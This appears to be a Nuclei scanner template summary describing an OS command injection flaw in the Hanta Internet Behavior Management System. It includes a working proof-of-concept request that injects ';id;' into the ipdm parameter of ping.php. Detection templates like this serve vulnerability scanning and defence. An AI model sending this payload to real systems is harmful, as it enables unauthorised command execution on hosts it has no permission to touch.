# Nuclei Template: Hanta Internet Behavior Management System - Remote Code Execution
**Template ID:** hanta-rce
**Vulnerability Class:** OS Command Injection
**Severity:** High
**CWE:** CWE-78
**Source:** Nuclei Template (`hanta-rce.yaml`)

## Vulnerability Information & PoC

## Description
Hanta Internet Behavior Management System is vulnerable to RCE.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=2;id;
```

